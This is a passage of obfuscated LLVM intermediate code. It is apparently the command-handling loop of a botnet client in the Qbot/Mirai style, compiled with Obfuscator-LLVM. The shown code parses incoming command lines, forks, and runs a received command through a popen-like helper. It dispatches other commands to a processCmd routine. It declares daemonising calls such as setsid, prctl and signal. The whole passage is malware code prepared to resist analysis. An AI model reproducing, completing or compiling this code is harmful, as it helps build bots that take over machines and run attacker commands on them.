; <label>:199:                                    ; preds = %193
  %200 = load i8*, i8** %16, align 8
  store i8 0, i8* %200, align 1
  %201 = load i8*, i8** %15, align 8
  %202 = getelementptr inbounds i8, i8* %201, i64 1
  store i8* %202, i8** %16, align 8
  %203 = load i8*, i8** %15, align 8
  %204 = load i8*, i8** %16, align 8
  %205 = call i64 @strlen(i8* %204) #10
  %206 = getelementptr inbounds i8, i8* %203, i64 %205
  %207 = getelementptr inbounds i8, i8* %206, i64 2
  store i8* %207, i8** %15, align 8
  br label %208

; <label>:208:                                    ; preds = %228, %199
  %209 = load i8*, i8** %15, align 8
  %210 = load i8*, i8** %15, align 8
  %211 = call i64 @strlen(i8* %210) #10
  %212 = sub i64 %211, 1
  %213 = getelementptr inbounds i8, i8* %209, i64 %212
  %214 = load i8, i8* %213, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp eq i32 %215, 10
  br i1 %216, label %226, label %217

; <label>:217:                                    ; preds = %208
  %218 = load i8*, i8** %15, align 8
  %219 = load i8*, i8** %15, align 8
  %220 = call i64 @strlen(i8* %219) #10
  %221 = sub i64 %220, 1
  %222 = getelementptr inbounds i8, i8* %218, i64 %221
  %223 = load i8, i8* %222, align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 13
  br label %226

; <label>:226:                                    ; preds = %217, %208
  %227 = phi i1 [ true, %208 ], [ %225, %217 ]
  br i1 %227, label %228, label %234

; <label>:228:                                    ; preds = %226
  %229 = load i8*, i8** %15, align 8
  %230 = load i8*, i8** %15, align 8
  %231 = call i64 @strlen(i8* %230) #10
  %232 = sub i64 %231, 1
  %233 = getelementptr inbounds i8, i8* %229, i64 %232
  store i8 0, i8* %233, align 1
  br label %208

; <label>:234:                                    ; preds = %226
  %235 = load i8*, i8** %15, align 8
  store i8* %235, i8** %17, align 8
  br label %236

; <label>:236:                                    ; preds = %248, %234
  %237 = load i8*, i8** %15, align 8
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp ne i32 %239, 32
  br i1 %240, label %241, label %246

; <label>:241:                                    ; preds = %236
  %242 = load i8*, i8** %15, align 8
  %243 = load i8, i8* %242, align 1
  %244 = zext i8 %243 to i32
  %245 = icmp ne i32 %244, 0
  br label %246

; <label>:246:                                    ; preds = %241, %236
  %247 = phi i1 [ false, %236 ], [ %245, %241 ]
  br i1 %247, label %248, label %251

; <label>:248:                                    ; preds = %246
  %249 = load i8*, i8** %15, align 8
  %250 = getelementptr inbounds i8, i8* %249, i32 1
  store i8* %250, i8** %15, align 8
  br label %236

; <label>:251:                                    ; preds = %246
  %252 = load i8*, i8** %15, align 8
  store i8 0, i8* %252, align 1
  %253 = load i8*, i8** %15, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %15, align 8
  %255 = load i8*, i8** %17, align 8
  store i8* %255, i8** %18, align 8
  br label %256

; <label>:256:                                    ; preds = %260, %251
  %257 = load i8*, i8** %18, align 8
  %258 = load i8, i8* %257, align 1
  %259 = icmp ne i8 %258, 0
  br i1 %259, label %260, label %269

; <label>:260:                                    ; preds = %256
  %261 = load i8*, i8** %18, align 8
  %262 = load i8, i8* %261, align 1
  %263 = zext i8 %262 to i32
  %264 = call i32 @toupper(i32 %263) #10
  %265 = trunc i32 %264 to i8
  %266 = load i8*, i8** %18, align 8
  store i8 %265, i8* %266, align 1
  %267 = load i8*, i8** %18, align 8
  %268 = getelementptr inbounds i8, i8* %267, i32 1
  store i8* %268, i8** %18, align 8
  br label %256

; <label>:269:                                    ; preds = %256
  %270 = load i8*, i8** %17, align 8
  %271 = call i32 @strcmp(i8* %270, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.70, i32 0, i32 0)) #10
  %272 = icmp eq i32 %271, 0
  br i1 %272, label %273, label %296

; <label>:273:                                    ; preds = %269
  %274 = call i32 @listFork()
  %275 = icmp ne i32 %274, 0
  br i1 %275, label %276, label %277

; <label>:276:                                    ; preds = %273
  br label %71

; <label>:277:                                    ; preds = %273
  %278 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %278, i8 0, i64 1024, i32 16, i1 false)
  %279 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %280 = load i8*, i8** %15, align 8
  %281 = call i32 (i8*, i8*, ...) @szprintf(i8* %279, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.71, i32 0, i32 0), i8* %280)
  %282 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %283 = call i32 @fdpopen(i8* %282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0))
  store i32 %283, i32* %20, align 4
  br label %284

; <label>:284:                                    ; preds = %289, %277
  %285 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %286 = load i32, i32* %20, align 4
  %287 = call i8* @fdgets(i8* %285, i32 1024, i32 %286)
  %288 = icmp ne i8* %287, null
  br i1 %288, label %289, label %293

; <label>:289:                                    ; preds = %284
  %290 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %290)
  %291 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %291, i8 0, i64 1024, i32 16, i1 false)
  %292 = call i32 @sleep(i32 1)
  br label %284

; <label>:293:                                    ; preds = %284
  %294 = load i32, i32* %20, align 4
  %295 = call i32 @fdpclose(i32 %294)
  call void @exit(i32 0) #14
  unreachable

; <label>:296:                                    ; preds = %269
  store i32 1, i32* %22, align 4
  %297 = load i8*, i8** %15, align 8
  %298 = call i8* @strtok(i8* %297, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0)) #2
  store i8* %298, i8** %23, align 8
  %299 = load i8*, i8** %17, align 8
  %300 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %299, i8** %300, align 16
  br label %301

; <label>:301:                                    ; preds = %332, %296
  %302 = load i8*, i8** %23, align 8
  %303 = icmp ne i8* %302, null
  br i1 %303, label %304, label %334

; <label>:304:                                    ; preds = %301
  %305 = load i8*, i8** %23, align 8
  %306 = load i8, i8* %305, align 1
  %307 = zext i8 %306 to i32
  %308 = icmp ne i32 %307, 10
  br i1 %308, label %309, label %332

; <label>:309:                                    ; preds = %304
  %310 = load i8*, i8** %23, align 8
  %311 = call i64 @strlen(i8* %310) #10
  %312 = add i64 %311, 1
  %313 = call noalias i8* @malloc(i64 %312) #2
  %314 = load i32, i32* %22, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %315
  store i8* %313, i8** %316, align 8
  %317 = load i32, i32* %22, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %318
  %320 = load i8*, i8** %319, align 8
  %321 = load i8*, i8** %23, align 8
  %322 = call i64 @strlen(i8* %321) #10
  %323 = add i64 %322, 1
  call void @llvm.memset.p0i8.i64(i8* %320, i8 0, i64 %323, i32 1, i1 false)
  %324 = load i32, i32* %22, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %325
  %327 = load i8*, i8** %326, align 8
  %328 = load i8*, i8** %23, align 8
  %329 = call i8* @strcpy(i8* %327, i8* %328) #2
  %330 = load i32, i32* %22, align 4
  %331 = add nsw i32 %330, 1
  store i32 %331, i32* %22, align 4
  br label %332

; <label>:332:                                    ; preds = %309, %304
  %333 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0)) #2
  store i8* %333, i8** %23, align 8
  br label %301

; <label>:334:                                    ; preds = %301
  %335 = load i32, i32* %22, align 4
  %336 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %335, i8** %336)
  %337 = load i32, i32* %22, align 4
  %338 = icmp sgt i32 %337, 1
  br i1 %338, label %339, label %353

; <label>:339:                                    ; preds = %334
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %340

; <label>:340:                                    ; preds = %349, %339
  %341 = load i32, i32* %24, align 4
  %342 = load i32, i32* %22, align 4
  %343 = icmp slt i32 %341, %342
  br i1 %343, label %344, label %352

; <label>:344:                                    ; preds = %340
  %345 = load i32, i32* %24, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %346
  %348 = load i8*, i8** %347, align 8
  call void @free(i8* %348) #2
  br label %349

; <label>:349:                                    ; preds = %344
  %350 = load i32, i32* %24, align 4
  %351 = add nsw i32 %350, 1
  store i32 %351, i32* %24, align 4
  br label %340

; <label>:352:                                    ; preds = %340
  br label %353

; <label>:353:                                    ; preds = %352, %334
  br label %354

; <label>:354:                                    ; preds = %353, %169
  br label %71

; <label>:355:                                    ; preds = %71
  %356 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0))
  br label %64
                                                  ; No predecessors!
  %358 = load i32, i32* %3, align 4
  ret i32 %358
}

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612883}
!2 = !{i32 -2146612192}
!3 = !{i32 -2146611443}
!4 = !{i32 -2146610620}
!5 = !{i32 -2146609800}
!6 = !{i32 -2146608456}
!7 = !{i32 -2146607594}
!8 = !{i32 -2146606873}
